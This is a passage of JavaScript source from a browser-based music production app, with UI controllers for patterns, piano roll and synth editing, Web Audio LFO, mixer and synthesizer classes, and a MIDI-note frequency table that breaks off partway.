			this._svgForms[ pat.type ].setSVGViewbox( blc._gsuiSVGform, obj.offset, obj.duration, this._dawcore.get.bpm() / 60 );
		}
	}
	_onaddBlock( id, obj, blc ) {
		const pat = this._dawcore.get.pattern( obj.pattern ),
			SVGs = this._svgForms[ pat.type ],
			svg = SVGs.createSVG( obj.pattern );

		blc._gsuiSVGform = svg;
		blc.children[ 3 ].append( svg );
		SVGs.setSVGViewbox( svg, obj.offset, obj.duration, this._dawcore.get.bpm() / 60 );
		blc.ondblclick = () => this._dawcore.callAction( "openPattern", obj.pattern );
		blc.querySelector( ".gsuiPatternroll-block-name" ).textContent = pat.name;
	}
}

Object.freeze( GSPatternroll );

class GSPatterns {
	constructor() {
		const uiPatterns = GSUI.createElement( "gsui-patterns" ),
			svgForms = Object.freeze( {
				keys: new gsuiKeysforms(),
				drums: new gsuiDrumsforms(),
				buffer: new gsuiWaveforms(),
				bufferHD: new gsuiWaveforms(),
			} );

		uiPatterns.onpatternDataTransfer = elPat => {
			const id = elPat.dataset.id;

			return `${ id }:${ this._dawcore.get.pattern( id ).duration }`;
		};
		uiPatterns.onchange = ( act, ...args ) => {
			if ( act in DAWCore.actions ) {
				this._dawcore.callAction( act, ...args );
			} else {
				lg( "GSPatterns.onchange", act, ...args );
			}
		};
		this.data = Object.freeze( {
			synths: {},
			patterns: {},
			channels: {},
		} );
		this.rootElement = uiPatterns;
		this.svgForms = svgForms;
		this._buffers = {};
		this._dawcore = null;
		this._uiPatterns = uiPatterns;
		this._synthsCrud = GSUtils.createUpdateDelete.bind( null, this.data.synths,
			this._createSynth.bind( this ),
			this._updateSynth.bind( this ),
			this._deleteSynth.bind( this ) );
		this._patternsCrud = GSUtils.createUpdateDelete.bind( null, this.data.patterns,
			this._createPattern.bind( this ),
			this._updatePattern.bind( this ),
			this._deletePattern.bind( this ) );
		this._channelsCrud = GSUtils.createUpdateDelete.bind( null, this.data.channels,
			this._createChannel.bind( this ),
			this._updateChannel.bind( this ),
			this._deleteChannel.bind( this ) );
		Object.seal( this );

		svgForms.bufferHD.hdMode( true );
		svgForms.bufferHD.setDefaultViewbox( 260, 48 );
	}

	// .........................................................................
	setDAWCore( core ) {
		this._dawcore = core;
	}
	clear() {
		Object.keys( this.data.patterns ).forEach( this._deletePattern, this );
		Object.keys( this.data.synths ).forEach( this._deleteSynth, this );
		Object.keys( this._buffers ).forEach( id => delete this._buffers[ id ] );
		this.svgForms.keys.empty();
		this.svgForms.drums.empty();
		this.svgForms.buffer.empty();
		this.svgForms.bufferHD.empty();
	}
	bufferLoaded( buffers ) {
		const pats = Object.entries( this._dawcore.get.patterns() ),
			bufToPat = pats.reduce( ( map, [ id, pat ] ) => {
				map[ pat.buffer ] = id;
				return map;
			}, {} );

		Object.entries( buffers ).forEach( ( [ idBuf, buf ] ) => {
			this._buffers[ idBuf ] = buf;
			this.svgForms.buffer.update( bufToPat[ idBuf ], buf.buffer );
			this.svgForms.bufferHD.update( bufToPat[ idBuf ], buf.buffer );
		} );
	}
	change( obj ) {
		this._synthsCrud( obj.synths );
		this._patternsCrud( obj.patterns );
		this._channelsCrud( obj.channels );
		if ( obj.keys || obj.drums || obj.drumrows || obj.patterns ) {
			Object.entries( this._dawcore.get.patterns() ).forEach( ( [ id, pat ] ) => {
				if (
					( pat.type === "drums" && ( obj.drumrows || obj.drums?.[ pat.drums ] || obj.patterns?.[ id ]?.duration ) ) ||
					( pat.type === "keys" && ( obj.keys?.[ pat.keys ] || obj.patterns?.[ id ]?.duration ) )
				) {
					this._updatePatternContent( id );
				}
			} );
		}
		if ( obj.patterns ) {
			this._uiPatterns.reorderPatterns( obj.patterns );
		}
		if ( "synthOpened" in obj ) {
			this._uiPatterns.selectSynth( obj.synthOpened );
		}
		if ( "patternDrumsOpened" in obj ) {
			this._uiPatterns.selectPattern( "drums", obj.patternDrumsOpened );
		}
		if ( "patternKeysOpened" in obj ) {
			this._uiPatterns.selectPattern( "keys", obj.patternKeysOpened );
		}
	}

	// .........................................................................
	_updatePatternContent( id ) {
		const get = this._dawcore.get,
			pat = get.pattern( id ),
			elPat = this._uiPatterns._getPattern( id );

		if ( elPat ) {
			const type = pat.type;

			if ( type === "keys" ) {
				this.svgForms.keys.update( id, get.keys( pat.keys ), pat.duration );
			} else if ( type === "drums" ) {
				this.svgForms.drums.update( id, get.drums( pat.drums ), get.drumrows(), pat.duration, get.stepsPerBeat() );
			} else if ( type === "buffer" ) {
				const buf = this._buffers[ pat.buffer ];

				if ( buf ) {
					this.svgForms.buffer.update( id, buf.buffer );
					this.svgForms.bufferHD.update( id, buf.buffer );
				}
			}
			if ( type !== "buffer" ) {
				this.svgForms[ type ].setSVGViewbox( elPat.querySelector( "svg" ), 0, pat.duration );
			}
		}
	}

	// .........................................................................
	_createSynth( id, obj ) {
		this.data.synths[ id ] = GSUtils.jsonCopy( obj );
		this._uiPatterns.addSynth( id );
		this._updateSynth( id, obj );
	}
	_updateSynth( id, obj ) {
		const dat = this.data.synths[ id ];

		Object.entries( obj ).forEach( ( [ prop, val ] ) => {
			dat[ prop ] = val;
			this._uiPatterns.changeSynth( id, prop, val );
		} );
		if ( "dest" in obj ) {
			this._uiPatterns.changeSynth( id, "destName", this._dawcore.get.channel( obj.dest ).name );
		}
	}
	_deleteSynth( id ) {
		delete this.data.synths[ id ];
		this._uiPatterns.deleteSynth( id );
	}

	// .........................................................................
	_createPattern( id, obj ) {
		const isBuf = obj.type === "buffer",
			SVG = this.svgForms[ isBuf ? "bufferHD" : obj.type ];

		this.data.patterns[ id ] = GSUtils.jsonCopy( obj );
		SVG.add( id );
		if ( isBuf ) {
			const buf = this._buffers[ obj.buffer ];

			this.svgForms.buffer.add( id );
			if ( buf ) {
				this.svgForms.buffer.update( id, buf.buffer );
				SVG.update( id, buf.buffer );
			}
		}
		this._uiPatterns.addPattern( id, obj );
		this._updatePattern( id, obj );
		this._uiPatterns.appendPatternSVG( id, SVG.createSVG( id ) );
	}
	_updatePattern( id, obj ) {
		const dat = this.data.patterns[ id ];

		Object.entries( obj ).forEach( ( [ prop, val ] ) => {
			dat[ prop ] = val;
			this._uiPatterns.changePattern( id, prop, val );
		} );
		if ( "dest" in obj ) {
			this._uiPatterns.changePattern( id, "destName", this._dawcore.get.channel( obj.dest ).name );
		}
	}
	_deletePattern( id ) {
		const pat = this.data.patterns[ id ];

		delete this.data.patterns[ id ];
		this.svgForms[ pat.type ].delete( id );
		if ( pat.type === "buffer" ) {
			this.svgForms.bufferHD.delete( id );
		}
		this._uiPatterns.deletePattern( id );
	}

	// .........................................................................
	_createChannel( id, obj ) {
		this.data.channels[ id ] = obj.name;
		this._uiPatterns.addChannel( id, obj.name );
	}
	_updateChannel( id, obj ) {
		if ( "name" in obj ) {
			this._uiPatterns.updateChannel( id, obj.name );
		}
	}
	_deleteChannel( id ) {
		delete this.data.channels[ id ];
		this._uiPatterns.deleteChannel( id );
	}
}

Object.freeze( GSPatterns );

class GSPianoroll {
	constructor() {
		const uiPianoroll = new gsuiPianoroll( {
				getData: () => this._dataKeys.data,
				onchange: this._onchange.bind( this ),
			} ),
			dataKeys = new DAWCore.controllers.keys( {
				dataCallbacks: {
					addKey: ( id, blc ) => uiPianoroll.addKey( id, blc ),
					removeKey: id => uiPianoroll.removeKey( id ),
					changeKeyProp: ( id, prop, val ) => uiPianoroll.changeKeyProp( id, prop, val ),
				},
			} );

		this.rootElement = uiPianoroll.rootElement;
		this.timeline = uiPianoroll.timeline;
		this._uiRoll = uiPianoroll;
		this._dataKeys = dataKeys;
		this._dawcore =
		this._keysId =
		this._patternId = null;
		Object.seal( this );

		uiPianoroll.uiKeys.onkeydown = midi => this._dawcore.pianoroll.liveKeydown( midi );
		uiPianoroll.uiKeys.onkeyup = midi => this._dawcore.pianoroll.liveKeyup( midi );
		this.rootElement.addEventListener( "gsuiEvents", this._ongsuiEvents.bind( this ) );
	}

	// .........................................................................
	setDAWCore( core ) {
		this._dawcore = core;
	}
	selectPattern( id ) {
		if ( id !== this._patternId ) {
			this._patternId = id;
			this._keysId = null;
			this._dataKeys.clear();
			this._uiRoll.reset();
			// this._uiRoll.toggleShadow( !id );
			if ( id ) {
				const pat = this._dawcore.get.pattern( id ),
					keys = this._dawcore.get.keys( pat.keys );

				this._keysId = pat.keys;
				this._dataKeys.change( keys );
				this._uiRoll.scrollToKeys();
			}
		}
	}
	change( obj ) {
		if ( "beatsPerMeasure" in obj || "stepsPerBeat" in obj ) {
			this._uiRoll.timeSignature(
				this._dawcore.get.beatsPerMeasure(),
				this._dawcore.get.stepsPerBeat() );
		}
		if ( "patternKeysOpened" in obj ) {
			this.selectPattern( obj.patternKeysOpened );
		} else {
			const keys = obj.keys && obj.keys[ this._keysId ];

			if ( keys ) {
				this._dataKeys.change( keys );
			}
		}
	}
	clear() {
		this._keysId =
		this._patternId = null;
		this._dataKeys.clear();
		this._uiRoll.reset();
	}
	getUIKeys() {
		return this._uiRoll.uiKeys;
	}

	// .........................................................................
	attached() {
		this._uiRoll.attached();
		this._uiRoll.octaves( 1, 7 );
	}
	currentTime( t ) {
		this._uiRoll.currentTime( t );
	}
	loop( a, b ) {
		this._uiRoll.loop( a, b );
	}

	// .........................................................................
	_ongsuiEvents( e ) {
		const d = e.detail;

		switch ( d.component ) {
			case "gsuiPianoroll":
				switch ( d.eventName ) {
					case "changeKeysProps":
						this._dawcore.callAction( "changeKeysProps", this._patternId, ...d.args );
						break;
				}
				break;
			case "gsuiTimeline":
				switch ( d.eventName ) {
					case "changeLoop":
						d.args[ 0 ] !== false
							? this._dawcore.pianoroll.setLoop( ...d.args )
							: this._dawcore.pianoroll.clearLoop();
						break;
					case "changeCurrentTime":
						this._dawcore.pianoroll.setCurrentTime( d.args[ 0 ] );
						break;
				}
				break;
		}
		e.stopPropagation();
	}

	// .........................................................................
	_onchange( obj, ...args ) {
		switch ( obj ) { // tmp
			case "add": this._dawcore.callAction( "addKey", this._patternId, ...args ); break;
			case "move": this._dawcore.callAction( "moveKeys", this._patternId, ...args ); break;
			case "clone": this._dawcore.callAction( "cloneSelectedKeys", this._patternId, ...args ); break;
			case "remove": this._dawcore.callAction( "removeKeys", this._patternId, ...args ); break;
			case "cropEnd": this._dawcore.callAction( "cropEndKeys", this._patternId, ...args ); break;
			case "redirect": this._dawcore.callAction( "redirectKey", this._patternId, ...args ); break;
			case "changeEnv": this._dawcore.callAction( "changeKeysEnv", this._patternId, ...args ); break;
			case "selection": this._dawcore.callAction( "selectKeys", this._patternId, ...args ); break;
			case "unselection": this._dawcore.callAction( "unselectAllKeys", this._patternId, ...args ); break;
			case "unselectionOne": this._dawcore.callAction( "unselectKey", this._patternId, ...args ); break;
		}
	}
}

Object.freeze( GSPianoroll );

class GSSynth {
	constructor() {
		const uiSynth = document.createElement( "gsui-synthesizer" ),
			uiEnv = document.createElement( "gsui-envelope" ),
			uiLFO = document.createElement( "gsui-lfo" ),
			dataSynth = new DAWCore.controllers.synth( {
				dataCallbacks: {
					addOsc: ( id, osc ) => uiSynth.addOscillator( id, osc ),
					removeOsc: id => uiSynth.removeOscillator( id ),
					changeEnvProp: ( k, v ) => uiEnv.setAttribute( k, v ),
					changeLFOProp: ( k, v ) => uiLFO.setAttribute( k, v ),
					changeOscProp: ( id, k, v ) => uiSynth.getOscillator( id ).setAttribute( k, v ),
					updateEnvWave: () => uiEnv.updateWave(),
					updateLFOWave: () => uiLFO.updateWave(),
					updateOscWave: id => uiSynth.getOscillator( id ).updateWave(),
				},
			} );

		this.rootElement = uiSynth;
		this._uiEnv = uiEnv;
		this._uiLFO = uiLFO;
		this._dataSynth = dataSynth;
		this._dawcore =
		this._synthId = null;
		Object.seal( this );

		uiSynth.setEnvelope( uiEnv );
		uiSynth.setLFO( uiLFO );
		uiSynth.addEventListener( "gsuiEvents", e => {
			const d = e.detail,
				a = d.args,
				id = this._synthId,
				dc = this._dawcore;

			switch ( d.component ) {
				case "gsuiEnvelope":
					switch ( d.eventName ) {
						case "toggle": dc.callAction( "toggleEnv", id ); break;
						case "change": dc.callAction( "changeEnv", id, ...a ); break;
						case "liveChange": dc.liveChangeSynth( id, { env: { [ a[ 0 ] ]: a[ 1 ] } } ); break;
					}
					break;
				case "gsuiLFO":
					switch ( d.eventName ) {
						case "toggle": dc.callAction( "toggleLFO", id ); break;
						case "change": dc.callAction( "changeLFO", id, ...a ); break;
						case "liveChange": dc.liveChangeSynth( id, { lfo: { [ a[ 0 ] ]: a[ 1 ] } } ); break;
					}
					break;
				case "gsuiSynthesizer":
					switch ( d.eventName ) {
						case "addOscillator": dc.callAction( "addOscillator", id ); break;
						case "reorderOscillator": dc.callAction( "reorderOscillator", id, a[ 0 ] ); break;
					}
					break;
				case "gsuiOscillator": {
					const oscId = e.target.dataset.id;

					switch ( d.eventName ) {
						case "remove": dc.callAction( "removeOscillator", id, oscId ); break;
						case "change": dc.callAction( "changeOscillator", id, oscId, ...a ); break;
						case "liveChange": dc.liveChangeSynth( id, { oscillators: { [ oscId ]: { [ a[ 0 ] ]: a[ 1 ] } } } ); break;
					}
				} break;
			}
			e.stopPropagation();
		} );
	}

	// .........................................................................
	setDAWCore( core ) {
		this._dawcore = core;
	}
	setWaveList( arr ) {
		this.rootElement.setWaveList( arr );
	}
	selectSynth( id ) {
		if ( id !== this._synthId ) {
			this._synthId = id;
			this._dataSynth.clear();
			if ( id ) {
				this._dataSynth.change( this._dawcore.get.synth( id ) );
			}
		}
	}
	change( obj ) {
		const synObj = obj.synths && obj.synths[ this._synthId ],
			get = this._dawcore.get;

		if ( "beatsPerMeasure" in obj || "stepsPerBeat" in obj ) {
			this._uiEnv.timeSignature( get.beatsPerMeasure(), get.stepsPerBeat() );
			this._uiLFO.timeSignature( get.beatsPerMeasure(), get.stepsPerBeat() );
		}
		if ( synObj ) {
			this._dataSynth.change( synObj );
			if ( synObj.oscillators ) {
				this.rootElement.reorderOscillators( synObj.oscillators );
			}
		}
		if ( "synthOpened" in obj ) {
			this.selectSynth( obj.synthOpened );
		}
	}
	clear() {
		this._dataSynth.clear();
	}
}

Object.freeze( GSSynth );

class gswaLFO {
	constructor( ctx ) {
		const node = ctx.createGain();

		this.ctx = ctx;
		this.node = node;
		this._oscNode =
		this._ampNode = null;
		this.data = Object.seal( {
			toggle: false,
			when: 0,
			whenStop: 0,
			offset: 0,
			type: "",
			delay: 0,
			attack: 0,
			amp: 0,
			speed: 0,
		} );
		Object.seal( this );
	}

	// .........................................................................
	start( d ) {
		const data = this.data;

		data.toggle = d.toggle || false;
		data.when = d.when || this.ctx.currentTime;
		data.whenStop = d.whenStop
			? Math.max( d.when + d.delay + d.attack + .1, d.whenStop )
			: 0;
		data.offset = d.offset || 0;
		data.type = d.type || "sine";
		data.delay = d.delay || 0;
		data.attack = d.attack || 0;
		data.amp = "amp" in d ? d.amp : 1;
		data.speed = "speed" in d ? d.speed : 4;
		if ( data.toggle && !this._oscNode ) {
			this._start();
		}
	}
	destroy() {
		if ( this._oscNode ) {
			this._stop( 0 );
			this._oscNode.disconnect();
			this._ampNode.disconnect();
			this._oscNode =
			this._ampNode = null;
		}
	}
	change( obj ) {
		Object.assign( this.data, obj );
		if ( this.data.toggle ) {
			if ( !this._oscNode ) {
				this._start();
			} else {
				this._change( obj );
			}
		} else if ( this._oscNode ) {
			this.destroy();
		}
	}

	// .........................................................................
	_start() {
		const d = this.data,
			osc = this.ctx.createOscillator(),
			amp = this.ctx.createGain();

		this._oscNode = osc;
		this._ampNode = amp;
		this._setAmp();
		this._setType();
		this._setSpeed();
		osc.connect( amp ).connect( this.node.gain );
		osc.start( d.when + d.delay - d.offset );
		if ( d.whenStop > 0 ) {
			this._stop( d.whenStop );
		}
	}
	_stop( when ) {
		this._oscNode.frequency.cancelScheduledValues( when );
		this._ampNode.gain.cancelScheduledValues( when );
		this._oscNode.stop( when );
	}
	_change( obj ) {
		if ( "type" in obj ) {
			this._setType();
		}
		if ( "speed" in obj ) {
			this._oscNode.frequency.cancelScheduledValues( 0 );
			this._setSpeed();
		}
		if ( "when" in obj || "offset" in obj ||
			"delay" in obj || "attack" in obj || "amp" in obj
		) {
			this._ampNode.gain.cancelScheduledValues( 0 );
			this._setAmp();
		}
	}
	_setType() {
		this._oscNode.type = this.data.type;
	}
	_setSpeed() {
		this._oscNode.frequency.setValueAtTime( this.data.speed, this.ctx.currentTime );
	}
	_setAmp() {
		const d = this.data,
			now = this.ctx.currentTime,
			atTime = d.when + d.delay - d.offset;

		if ( now <= atTime && d.attack > 0 ) {
			this._ampNode.gain.setValueAtTime( 0, atTime );
			this._ampNode.gain.setValueCurveAtTime( new Float32Array( [ 0, d.amp ] ), atTime, d.attack );
		} else {
			this._ampNode.gain.setValueAtTime( d.amp, now );
		}
	}
}

Object.freeze( gswaLFO );

class gswaMixer {
	constructor() {
		this.ctx =
		this.connectedTo = null;
		this._chans = {};
		this._fftSize = 4096;
		this.audioDataL = new Uint8Array( this._fftSize / 2 );
		this.audioDataR = new Uint8Array( this._fftSize / 2 );
		this._ctrlMixer = new DAWCore.controllers.mixer( {
			dataCallbacks: {
				addChannel: this._addChan.bind( this ),
				removeChannel: this._removeChan.bind( this ),
				toggleChannel: this._toggleChan.bind( this ),
				redirectChannel: this._redirectChan.bind( this ),
				changePanChannel: this._updateChanPan.bind( this ),
				changeGainChannel: this._updateChanGain.bind( this ),
			},
		} );
		Object.seal( this );
	}

	setContext( ctx ) {
		this.disconnect();
		this.ctx = ctx;
		if ( "main" in this._ctrlMixer.data.channels ) {
			this._ctrlMixer.recall();
		} else {
			this._ctrlMixer.change( {
				channels: {
					main: {
						toggle: true,
						name: "main",
						gain: 1,
						pan: 0,
					},
				},
			} );
		}
	}
	change( obj ) {
		this._ctrlMixer.change( obj );
	}
	clear() {
		this._ctrlMixer.clear();
		this._ctrlMixer.change( {
			channels: {
				main: {
					toggle: true,
					name: "main",
					gain: 1,
					pan: 0,
				},
			},
		} );
	}
	connect( dest ) {
		this.disconnect();
		this._chans.main.output.connect( dest );
		this.connectedTo = dest;
	}
	disconnect() {
		if ( this._chans.main ) {
			this._chans.main.output.disconnect();
			this.connectedTo = null;
		}
	}
	getChanInput( id ) {
		return this._chans[ id ]?.input;
	}
	getChanOutput( id ) {
		return this._chans[ id ]?.pan.getInput();
	}
	fillAudioData( chanId ) {
		const nodes = this._chans[ chanId ];

		nodes.analyserL.getByteFrequencyData( this.audioDataL );
		nodes.analyserR.getByteFrequencyData( this.audioDataR );
	}

	// chan:
	_addChan( id ) {
		const ctx = this.ctx,
			pan = new gswaStereoPanner( ctx ),
			gain = ctx.createGain(),
			input = ctx.createGain(),
			output = ctx.createGain(),
			splitter = ctx.createChannelSplitter( 2 ),
			analyserL = ctx.createAnalyser(),
			analyserR = ctx.createAnalyser();

		analyserL.fftSize =
		analyserR.fftSize = this._fftSize;
		analyserL.smoothingTimeConstant =
		analyserR.smoothingTimeConstant = 0;
		input.connect( pan.getInput() );
		pan.connect( gain );
		gain.connect( output );
		gain.connect( splitter );
		splitter.connect( analyserL, 0 );
		splitter.connect( analyserR, 1 );
		this._chans[ id ] = {
			input, pan, gain, output, splitter, analyserL, analyserR,
			analyserData: new Uint8Array( analyserL.frequencyBinCount )
		};
		Object.entries( this._ctrlMixer.data.channels ).forEach( kv => {
			if ( kv[ 1 ].dest === id ) {
				this._redirectChan( kv[ 0 ], id );
			}
		} );
	}
	_redirectChan( id, val ) {
		this._chans[ id ].output.disconnect();
		if ( val in this._ctrlMixer.data.channels ) {
			this._chans[ id ].output.connect( this.getChanInput( val ) );
		}
	}
	_toggleChan( id, val ) {
		this._chans[ id ].gain.gain.setValueAtTime( val ? this._ctrlMixer.data.channels[ id ].gain : 0, this.ctx.currentTime );
	}
	_updateChanPan( id, val ) {
		this._chans[ id ].pan.setValueAtTime( val, this.ctx.currentTime );
	}
	_updateChanGain( id, val ) {
		this._chans[ id ].gain.gain.setValueAtTime( val, this.ctx.currentTime );
	}
	_removeChan( id ) {
		const nodes = this._chans[ id ];

		nodes.pan.disconnect();
		nodes.gain.disconnect();
		nodes.input.disconnect();
		nodes.output.disconnect();
		nodes.splitter.disconnect();
		delete this._chans[ id ];
	}
}

class gswaSynth {
	constructor() {
		const gsdata = new DAWCore.controllers.synth( {
				dataCallbacks: {
					addOsc: this._addOsc.bind( this ),
					removeOsc: this._removeOsc.bind( this ),
					changeOsc: this._changeOsc.bind( this ),
					changeLFO: this._changeLFO.bind( this ),
				},
			} );

		this._bps = 1;
		this.gsdata = gsdata;
		this.ctx =
		this.output = null;
		this.nyquist = 24000;
		this._startedKeys = new Map();
		Object.seal( this );
	}

	// Context, dis/connect
	// .........................................................................
	setContext( ctx ) {
		this.stopAllKeys();
		this.ctx = ctx;
		this.nyquist = ctx.sampleRate / 2;
		this.output = ctx.createGain();
		this.gsdata.recall();
	}
	setBPM( bpm ) {
		this._bps = bpm / 60;
	}
	change( obj ) {
		this.gsdata.change( obj );
	}

	// add/remove/update oscs
	// .........................................................................
	_removeOsc( id ) {
		this._startedKeys.forEach( key => {
			this._destroyOscNode( key.oscNodes.get( id ) );
			key.oscNodes.delete( id );
		} );
	}
	_addOsc( id, osc ) {
		this._startedKeys.forEach( k => k.oscNodes.set( id, this._createOscNode( k, id ) ) );
	}
	_changeOsc( id, obj ) {
		const now = this.ctx.currentTime,
			objEnt = Object.entries( obj );

		this._startedKeys.forEach( key => {
			const nodes = key.oscNodes.get( id );

			objEnt.forEach( ( [ prop, val ] ) => {
				switch ( prop ) {
					case "type": this._nodeOscSetType( nodes.oscNode, val ); break;
					case "pan": nodes.panNode.pan.setValueAtTime( val, now ); break;
					case "gain": nodes.gainNode.gain.setValueAtTime( val, now ); break;
					case "detune": nodes.oscNode.detune.setValueAtTime( val * 100, now ); break;
				}
			} );
		} );
	}
	_changeLFO( obj ) {
		const nobj = { ...obj };

		if ( "delay" in nobj ) { nobj.delay /= this._bps; }
		if ( "attack" in nobj ) { nobj.attack /= this._bps; }
		if ( "speed" in nobj ) { nobj.speed *= this._bps; }
		this._startedKeys.forEach( key => key.LFONode.change( nobj ) );
	}

	// start
	// .........................................................................
	startKey( blocks, when, off, dur ) {
		const id = ++gswaSynth._startedMaxId.value,
			blcsLen = blocks.length,
			blc0 = blocks[ 0 ][ 1 ],
			blcLast = blocks[ blcsLen - 1 ][ 1 ],
			blc0when = blc0.when,
			atTime = when - off,
			ctx = this.ctx,
			bps = this._bps,
			lfo = this.gsdata.data.lfo,
			oscs = this.gsdata.data.oscillators,
			key = Object.freeze( {
				when,
				off,
				dur,
				pan: blc0.pan,
				midi: blc0.key,
				gain: blc0.gain,
				lowpass: blc0.lowpass,
				highpass: blc0.highpass,
				attack: blc0.attack / bps || .005,
				release: blcLast.release / bps || .005,
				variations: [],
				oscNodes: new Map(),
				LFONode: new gswaLFO( ctx ),
				envGainNode: ctx.createGain(),
				gainNode: ctx.createGain(),
				panNode: ctx.createStereoPanner(),
				lowpassNode: ctx.createBiquadFilter(),
				highpassNode: ctx.createBiquadFilter(),
			} );

		if ( blcsLen > 1 ) {
			blocks.reduce( ( prev, [ , blc ] ) => {
				if ( prev ) {
					const prevWhen = prev.when - blc0when,
						when = ( prevWhen + prev.duration ) / bps;

					key.variations.push( {
						when,
						duration: ( blc.when - blc0when ) / bps - when,
						pan: [ prev.pan, blc.pan ],
						midi: [ prev.key, blc.key ],
						gain: [ prev.gain, blc.gain ],
						lowpass: [
							this._calcLowpass( prev.lowpass ),
							this._calcLowpass( blc.lowpass ),
						],
						highpass: [
							this._calcHighpass( prev.highpass ),
							this._calcHighpass( blc.highpass ),
						],
					} );
				}
				return blc;
			}, null );
		}
		key.lowpassNode.type = "lowpass";
		key.highpassNode.type = "highpass";
		key.panNode.pan.setValueAtTime( key.pan, atTime );
		key.gainNode.gain.setValueAtTime( key.gain, atTime );
		key.lowpassNode.frequency.setValueAtTime( this._calcLowpass( key.lowpass ), atTime );
		key.highpassNode.frequency.setValueAtTime( this._calcHighpass( key.highpass ), atTime );
		key.LFONode.start( {
			toggle: lfo.toggle,
			when: key.when,
			whenStop: Number.isFinite( key.dur ) ? key.when + key.dur : 0,
			offset: key.offset,
			type: lfo.type,
			delay: lfo.delay / this._bps,
			attack: lfo.attack / this._bps,
			speed: lfo.speed * this._bps,
			amp: lfo.amp,
		} );
		Object.keys( oscs ).forEach( id => key.oscNodes.set( id, this._createOscNode( key, id ) ) );
		this._scheduleKeyEnv( key );
		this._scheduleVariations( key );
		key.LFONode.node
			.connect( key.envGainNode )
			.connect( key.gainNode )
			.connect( key.panNode )
			.connect( key.lowpassNode )
			.connect( key.highpassNode )
			.connect( this.output );
		this._startedKeys.set( id, key );
		return id;
	}

	// stop
	// .........................................................................
	stopAllKeys() {
		this._startedKeys.forEach( ( _key, id ) => this.stopKey( id ) );
	}
	stopKey( id ) {
		const key = this._startedKeys.get( id );

		if ( key ) {
			if ( Number.isFinite( key.dur ) ) {
				this._stopKey( id );
			} else {
				key.envGainNode.gain.cancelScheduledValues( 0 );
				key.envGainNode.gain.setValueCurveAtTime(
					new Float32Array( [ key.gain, 0 ] ), this.ctx.currentTime + .01, .02 );
				setTimeout( this._stopKey.bind( this, id ), .4 * 1000 );
			}
		} else {
			console.error( "gswaSynth: stopKey id invalid", id );
		}
	}
	_stopKey( id ) {
		const key = this._startedKeys.get( id );

		key.oscNodes.forEach( this._destroyOscNode, this );
		key.LFONode.destroy();
		this._startedKeys.delete( id );
	}

	// private:
	_calcLowpass( val ) {
		return this._calcExp( val, this.nyquist, 2 );
	}
	_calcHighpass( val ) {
		return this._calcExp( 1 - val, this.nyquist, 3 );
	}
	_calcExp( x, total, exp ) {
		return exp === 0
			? x
			: Math.expm1( x ) ** exp / ( ( Math.E - 1 ) ** exp ) * total;
	}

	// default gain envelope
	_scheduleKeyEnv( key ) {
		const par = key.envGainNode.gain,
			{ when, off, dur, attack, release } = key;

		par.cancelScheduledValues( 0 );
		if ( off < .0001 ) {
			par.setValueAtTime( 0, when );
			par.setValueCurveAtTime( new Float32Array( [ 0, 1 ] ), when, attack );
		}
		if ( Number.isFinite( dur ) && dur - ( off < .0001 ? attack : 0 ) >= release ) {
			par.setValueCurveAtTime( new Float32Array( [ 1, 0 ] ), when + dur - release, release );
		}
	}

	// keys linked, variations
	_scheduleVariations( key ) {
		key.variations.forEach( va => {
			const when = key.when - key.off + va.when,
				dur = va.duration,
				freqArr = new Float32Array( [
					gswaSynth.midiKeyToHz[ va.midi[ 0 ] ],
					gswaSynth.midiKeyToHz[ va.midi[ 1 ] ]
				] );

			if ( when > this.ctx.currentTime && dur > 0 ) {
				key.oscNodes.forEach( nodes => nodes.oscNode.frequency.setValueCurveAtTime( freqArr, when, dur ) );
				key.panNode.pan.setValueCurveAtTime( new Float32Array( va.pan ), when, dur );
				key.gainNode.gain.setValueCurveAtTime( new Float32Array( va.gain ), when, dur );
				key.lowpassNode.frequency.setValueCurveAtTime( new Float32Array( va.lowpass ), when, dur );
				key.highpassNode.frequency.setValueCurveAtTime( new Float32Array( va.highpass ), when, dur );
			}
		} );
	}

	// createOscNode
	_createOscNode( key, id ) {
		const atTime = key.when - key.off,
			osc = this.gsdata.data.oscillators[ id ],
			oscNode = this.ctx.createOscillator(),
			panNode = this.ctx.createStereoPanner(),
			gainNode = this.ctx.createGain(),
			nodes = Object.freeze( {
				oscNode,
				panNode,
				gainNode,
			} );

		this._nodeOscSetType( oscNode, osc.type );
		oscNode.detune.setValueAtTime( osc.detune * 100, atTime );
		oscNode.frequency.setValueAtTime( gswaSynth.midiKeyToHz[ key.midi ], atTime );
		panNode.pan.setValueAtTime( osc.pan, atTime );
		gainNode.gain.setValueAtTime( osc.gain, atTime );
		oscNode
			.connect( panNode )
			.connect( gainNode )
			.connect( key.LFONode.node );
		oscNode.start( key.when );
		if ( Number.isFinite( key.dur ) ) {
			oscNode.stop( key.when + key.dur );
		}
		return nodes;
	}
	_destroyOscNode( nodes ) {
		nodes.oscNode.stop();
		nodes.oscNode.disconnect();
	}
	_nodeOscSetType( oscNode, type ) {
		if ( gswaSynth.nativeTypes.indexOf( type ) > -1 ) {
			oscNode.type = type;
		} else {
			oscNode.setPeriodicWave( gswaPeriodicWaves.get( this.ctx, type ) );
		}
	}
}

gswaSynth._startedMaxId = Object.seal( { value: 0 } );
gswaSynth.nativeTypes = Object.freeze( [ "sine", "triangle", "sawtooth", "square" ] );
gswaSynth.midiKeyToHz = [];

Object.freeze( gswaSynth );

/*
This midi array start from 0, this means C#3's frequency is gswaSynth.midiKeyToHz[ 12 * 3 + 1 ].
*/

gswaSynth.midiKeyToHz.push(
	   0, // [0] -> C0 (unused)
	   0,
	   0,
	   0,
	   0,
	   0,
	   0,
	   0,
	   0,
	   0,
	   0,
	   0,

	  32.7032, // [12] -> C1
	  34.6479,
	  36.7081,
	  38.8909,
	  41.2035,
	  43.6536,
	  46.2493,
	  48.9995,
	  51.9130,
	  55,
	  58.2705,
	  61.7354,

	  65.4064, // [24] -> C2
	  69.2957,
	  73.4162,
	  77.7817,
	  82.4069,
	  87.3071,
	  92.4986,
	  97.9989,
	 103.826,
	 110,
	 116.541,
	 123.471,

	 130.813, // [36] -> C3
	 138.591,
	 146.832,
	 155.563,
	 164.814,
	 174.614,
	 184.997,
	 195.998,
	 207.652,
	 220,
	 233.082,
	 246.942,

	 261.626, // [48] -> C4
	 277.183,
	 293.665,
	 311.127,
	 329.628,
	 349.228,
	 369.994,
	 391.995,
	 415.305,
	 440,
	 466.164,
	 493.883,

	 523.251, // [60] -> C5
	 554.365,
	 587.33,
	 622.254,
	 659.255,
	 698.456,
	 739.989,
	 783.991,
	 830.609,
	 880,
	 932.328,
	 987.767,

	1046.5, // [72] -> C6
	1108.73,
